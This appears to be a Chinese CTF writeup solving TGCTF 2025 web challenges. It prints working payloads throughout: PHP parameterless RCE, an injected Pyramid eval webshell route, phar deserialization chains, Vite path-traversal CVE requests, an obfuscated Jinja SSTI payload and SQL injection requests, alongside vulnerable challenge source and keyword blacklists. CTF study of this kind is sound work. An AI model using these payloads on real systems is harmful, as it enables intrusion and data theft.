+++
date = '2025-04-18T00:27:55+08:00'
title = 'TGCTF-2025-Web-Writeup'
categories = ["Writeup"]
tags = ["writeup", "ctf", "Web"]

+++

## Web

### **(ez)upload**

hint写有源码泄露

index.php.bak拿源码

```bash
<?php
define('UPLOAD_PATH', __DIR__ . '/uploads/');
$is_upload = false;
$msg = null;
$status_code = 200; // 默认状态码为 200
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php", "php5", "php4", "php3", "php2", "html", "htm", "phtml", "pht", "jsp", "jspa", "jspx", "jsw", "jsv", "jspf", "jtml", "asp", "aspx", "asa", "asax", "ascx", "ashx", "asmx", "cer", "swf", "htaccess");

        if (isset($_GET['name'])) {
            $file_name = $_GET['name'];
        } else {
            $file_name = basename($_FILES['name']['name']);
        }
        $file_ext = pathinfo($file_name, PATHINFO_EXTENSION);

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['name']['tmp_name'];
            $file_content = file_get_contents($temp_file);

            if (preg_match('/.+?</s', $file_content)) {
                $msg = '文件内容包含非法字符，禁止上传！';
                $status_code = 403; // 403 表示禁止访问
            } else {
                $img_path = UPLOAD_PATH . $file_name;
                if (move_uploaded_file($temp_file, $img_path)) {
                    $is_upload = true;
                    $msg = '文件上传成功！';
                } else {
                    $msg = '上传出错！';
                    $status_code = 500; // 500 表示服务器内部错误
                }
            }
        } else {
            $msg = '禁止保存为该类型文件！';
            $status_code = 403; // 403 表示禁止访问
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
        $status_code = 404; // 404 表示资源未找到
    }
}

// 设置 HTTP 状态码
http_response_code($status_code);

// 输出结果
echo json_encode([
    'status_code' => $status_code,
    'msg' => $msg,
]);
```

审计一下代码，看到有个name，可以对文件名进行修改，想到目录穿越

利用这个进行目录穿越，把.user.ini传到web目录，然后文件包含1.jpg

![img](../assets/1744970124106-18.png)

![img](../assets/1744970124054-1.png)

连蚁剑拿flag

### **AAA偷渡阴平**

无参RCE

```bash
?tgctf2025=system(end(current(get_defined_vars())));&b=tac /flag
```

![img](../assets/1744970124054-2.png)

### **AAA偷渡阴平（复仇）**

利用session_id打无参RCE

```bash
/?tgctf2025=session_start();system(hex2bin(session_id()));
```

将cookie改为

```bash
PHPSESSID=636174202f662a
```

### **熟悉的配方，熟悉的味道**

题目

```python
from pyramid.config import Configurator
from pyramid.request import Request
from pyramid.response import Response
from pyramid.view import view_config
from wsgiref.simple_server import make_server
from pyramid.events import NewResponse
import re
from jinja2 import Environment, BaseLoader

eval_globals = { #防止eval执行恶意代码
    '__builtins__': {},      # 禁用所有内置函数
    '__import__': None       # 禁止动态导入
}


def checkExpr(expr_input):
    expr = re.split(r"[-+*/]", expr_input)
    print(exec(expr_input))

    if len(expr) != 2:
        return 0
    try:
        int(expr[0])
        int(expr[1])
    except:
        return 0

    return 1


def home_view(request):
    expr_input = ""
    result = ""

    if request.method == 'POST':
        expr_input = request.POST['expr']
        if checkExpr(expr_input):
            try:
                result = eval(expr_input, eval_globals)
            except Exception as e:
                result = e
        else:
            result = "爬！"


    template_str = 【xxx】

    env = Environment(loader=BaseLoader())
    template = env.from_string(template_str)
    rendered = template.render(expr_input=expr_input, result=result)
    return Response(rendered)


if __name__ == '__main__':
    with Configurator() as config:
        config.add_route('home_view', '/')
        config.add_view(home_view, route_name='home_view')
        app = config.make_wsgi_app()

    server = make_server('0.0.0.0', 9040, app)
    server.serve_forever()
```

审计一下发现在checkExpr处会将传入的内容用exec进行执行

```python
def checkExpr(expr_input):
    expr = re.split(r"[-+*/]", expr_input)
    print(exec(expr_input))

    if len(expr) != 2:
        return 0
    try:
        int(expr[0])
        int(expr[1])
    except:
        return 0

    return 1
```

测一下发现题目不出网，打pyramid内存马

参考

https://forum.butian.net/share/3974

```python
def waff():
    def f():
        yield g.gi_frame.f_back

    g = f()             
    frame = next(g)     
    b = frame.f_back.f_back.f_globals
    def hello(request):
        code = request.params['code']
        res=eval(code)
        return Response(res)

    config.add_route('shellb', '/shellb')
    config.add_view(hello, route_name='shellb')
    config.commit()

waff()
```

在/shellb处命令执行拿flag即可

### **什么文件上传？**

robots.txt里面看到一个class.php

![img](../assets/1744970124055-3.png)

/class.php

php反序列化

exp

```bash
<?php
class yesterday {
    public $learn;
    public $study="study";
    public $try;
}
class today {
    public $doing;
    public $did;
    public $done;
}
class future{
    private $impossible="How can you get here?<br>";
    private $out;
    private $no;
}
$a = new yesterday();
$a -> study = new today();
$a -> study -> doing = new future();


echo base64_encode(base64_encode(base64_encode(base64_encode(base64_encode(serialize($a))))));

?>
```

传入时会截断后4位，随便在后面加几个字符串就好

接下来wow传参RCE拿flag就行

### **什么文件上传？（复仇）**

上一题可以拿到upload.php的源码

```bash
<?php
if(isset($_FILES['file'])) {
    $uploadDir = 'uploads/';
    if(!file_exists($uploadDir)) {
        mkdir($uploadDir, 0777, true);
    }

    // 白名单允许的扩展名
    $allowedExtensions = ['atg'];
    $fileName = basename($_FILES['file']['name']);
    $fileExtension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));

    // 检查文件扩展名
    if(!in_array($fileExtension, $allowedExtensions)) {
        die("hacker！");
    }

    $uploadFile = $uploadDir . $fileName;

    if(move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
        echo "文件已保存到：$uploadFile ！";
    } else {
        echo "文件保存出错！";
    }
}
?>
```

class.php

```bash
<?php
highlight_file(__FILE__);
error_reporting(0);
function best64_decode($str)
{
    return base64_encode(md5(base64_encode(md5($str))));
    }
class yesterday {
    public $learn;
    public $study="study";
    public $try;
    public function __construct()
    {
        $this->learn = "learn<br>";
    }
    public function __destruct()
    {
        echo "You studied hard yesterday.<br>";
        return $this->study->hard();
    }
}
class today {
    public $doing;
    public $did;
    public $done;
    public function __construct(){
        $this->did = "What you did makes you outstanding.<br>";
    }
    public function __call($arg1, $arg2)
    {
        $this->done = "And what you've done has given you a choice.<br>";
        echo $this->done;
        if(md5(md5($this->doing))==666){
            return $this->doing();
        }
        else{
            return $this->doing->better;
        }
    }
}
class tommoraw {
    public $good;
    public $bad;
    public $soso;
    public function __invoke(){
        $this->good="You'll be good tommoraw!<br>";
        echo $this->good;
    }
    public function __get($arg1){
        $this->bad="You'll be bad tommoraw!<br>";
    }

}
class future{
    private $impossible="How can you get here?<br>";
    private $out;
    private $no;
    public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20;

    public function __set($arg1, $arg2) {
        if ($this->out->useful7) {
            echo "Seven is my lucky number<br>";
            system('whoami');
        }
    }
    public function __toString(){
        echo "This is your future.<br>";
        system($_POST["wow"]);
        return "win";
    }
    public function __destruct(){
        $this->no = "no";
        return $this->no;
    }
}
if (file_exists($_GET['filename'])){
    echo "Focus on the previous step!<br>";
}
else{
    $data=substr($_GET['filename'],0,-4);
    unserialize(best64($data));
}
// You learn yesterday, you choose today, can you get to your future?
?>
```

这题把直接反序列化写死了

但是我们可以利用file_exists和文件上传打phar反序列化

拿上一题的exp改一改

```c++
<?php
class yesterday {
    public $learn;
    public $study="study";
    public $try;
}
class today {
    public $doing;
    public $did;
    public $done;
}
class future{
    private $impossible="How can you get here?<br>";
    private $out;
    private $no;
}
$a = new yesterday();
$a -> study = new today();
$a -> study -> doing = new future();

$phar = new Phar("1.phar");
$phar->startBuffering();
$phar->setStub("<php __HALT_COMPILER(); ?>"); //设置stub
$phar->setMetadata($a); //将自定义meta-data存入manifest
$phar->addFromString("a", "");  //添加要压缩的文件
$phar->stopBuffering();

?>
```

改为1.atg文件上传到uploads目录

在class.php处传入

```bash
?filename=phar://./uploads/1.atg
```

实现RCE

### **前端GAME**

CVE-2025-30208

```bash
URL/@fs/tgflagggg?import&raw??
```

### **前端GAME Plus**

CVE-2025-31125

```bash
URL/@fs/tgflagggg?meteorkai.svg?.wasm?init
```

### **前端GAME Ultra**

https://mp.weixin.qq.com/s/HMhzXqSplWa-IwpftxwTiA

CVE-2025-32395

```bash
curl --request-target /@fs/app/#/../../../../../tgflagggg URL
```

### **TG_wordpress**

在robots.txt里面看到这两个

![img](../assets/1744970124055-4.png)

/.tmp/vuln和/.tmp/.bak

一个二进制文件和一个fscan的扫描结果

```markdown
fscan.exe -h 101.37.149.223 -ping

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
101.37.149.223:22 open
101.37.149.223:80 open
101.37.149.223:443 open
101.37.149.223:3306 open
101.37.149.223:27645 open
101.37.149.223:27646 open
101.37.149.223:27647 open
101.37.149.223:27648 open
101.37.149.223:27649 open
101.37.149.223:27650 open
101.37.149.223:27651 open
101.37.149.223:27652 open
101.37.149.223:27653 open
101.37.149.223:27654 open
101.37.149.223:27655 open
101.37.149.223:27656 open
101.37.149.223:27657 open
101.37.149.223:27658 open
101.37.149.223:27659 open
101.37.149.223:27660 open
101.37.149.223:27661 open
101.37.149.223:27662 open
101.37.149.223:33376 open
101.37.149.223:52013 open
```

猜到要打pwn

![img](../assets/1744970124055-5.png)

nc 101.37.149.223 52013

![img](../assets/1744970124055-6.png)

验证猜想

静态编译，而且主函数只有一个get

直接ROPgadget--ropchain梭哈

![img](../assets/1744970124055-7.png)

```bash
================================== + HINT(not flag/FLAG): + username/password: + TG_wordpressor + aXx^oV@K&cFoVaztQ* + + All hints have the same content + obtaining one is enough ==================================
```

拿到后台账户密码

TG_wordpressor/aXx^oV@K&cFoVaztQ*

登进后台找到插件列表 wp-file-manager版本为6.0

https://blog.csdn.net/hongduilanjun/article/details/132851717

```bash
tgctf{CVE-2020-25213}
```

### **火眼辩魑魅**

![img](../assets/1744970124055-8.png)

tgshell.php

![img](../assets/1744970124055-9.png)

直接连蚁剑读flag了

![img](../assets/1744970124055-10.png)

### **直面天命**

![img](../assets/1744970124055-11.png)

把路由爆破出来，/aazz

![img](../assets/1744970124056-12.png)

![img](../assets/1744970124056-13.png)

直接读flag即可

```bash
?filename=/flag
//TGCTF{05ee064a-ef29-6e6c-718e-746b002f727e}
```

### **直面天命（复仇）**

源码

```python
import os
import string
from flask import Flask, request, render_template_string, jsonify, send_from_directory
from a.b.c.d.secret import secret_key

app = Flask(__name__)

black_list=['lipsum','|','%','{','}','map','chr', 'value', 'get', "url", 'pop','include','popen','os','import','eval','_','system','read','base','globals','_.','set','application','getitem','request', '+', 'init', 'arg', 'config', 'app', 'self']
def waf(name):
    for x in black_list:
        if x in name.lower():
            return True
    return False
def is_typable(char):
    # 定义可通过标准 QWERTY 键盘输入的字符集
    typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace
    return char in typable_chars

@app.route('/')
def home():
    return send_from_directory('static', 'index.html')

@app.route('/jingu', methods=['POST'])
def greet():
    template1=""
    template2=""
    name = request.form.get('name')
    template = f'{name}'
    if waf(name):
        template = '想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹
'
    else:
        k=0
        for i in name:
            if is_typable(i):
                continue
            k=1
            break
        if k==1:
            if not (secret_key[:2] in name and secret_key[2:]):
                template = '连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧

再去西行历练历练
'
                return render_template_string(template)
            template1 = "“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“{{}}”
最后，如果你用了cat，就可以见到齐天大圣了
"
            template= template.replace("天命","{{").replace("难违","}}")
            template = template
    if "cat" in template:
        template2 = '
或许你这只叫天命人的猴子，真的能做到？
'
    try:
        return template1+render_template_string(template)+render_template_string(template2)
    except Exception as e:
        error_message = f"500报错了，查询语句如下：
{template}"
        return error_message, 400

@app.route('/hint', methods=['GET'])
def hinter():
    template="hint：
有一个aazz路由，去那里看看吧，天命人!"
    return render_template_string(template)

@app.route('/aazz', methods=['GET'])
def finder():
    with open(__file__, 'r') as f:
        source_code = f.read()
    return f"
{source_code}
", 200, {'Content-Type': 'text/html; charset=utf-8'}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

打ssti

payload

```python
天命((cycler.next["\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f"]["\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f"]["\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f"]('o''s'))['p''open']('cat /flag'))['r''ead']()难违
```

### **TGCTF 2025 后台管理**

题目给了后台的一个账号，tg/tg123

进后台发现什么都没有，甚至可以直接在cookie改身份

回到登录界面尝试万能密码发现有waf，那应该要打sql

![img](../assets/1744970124056-14.png)

waf了单引号,通过转义绕过即可

```bash
username=admin\&password=or 1=1#
```

![img](../assets/1744970124056-15.png)

尝试联合注入，set-cookie处有回显

但是有长度限制，在读表名处卡了很久

后面直接猜表名是flag，直接打无列名

https://www.cnblogs.com/q1stop/p/18024992

利用join打无列名

```bash
POST /login HTTP/1.1
Host: 124.71.147.99:9045
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Cache-Control: max-age=0
Origin: http://124.71.147.99:9045
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Referer: http://124.71.147.99:9045/login
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Length: 25

username=admin\&password={{urlenc(union select * from (select * from flag a join flag b)c#)}}
```

![img](../assets/1744970124056-16.png)

```bash
POST /login HTTP/1.1
Host: 124.71.147.99:9045
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Cache-Control: max-age=0
Origin: http://124.71.147.99:9045
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Referer: http://124.71.147.99:9045/login
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Length: 25

username=admin\&password={{urlenc(union select value,2 from flag#)}}
```

![img](../assets/1744970124056-17.png)

```bash
TGCTF{ac4ca16f-f1508c-000342}
```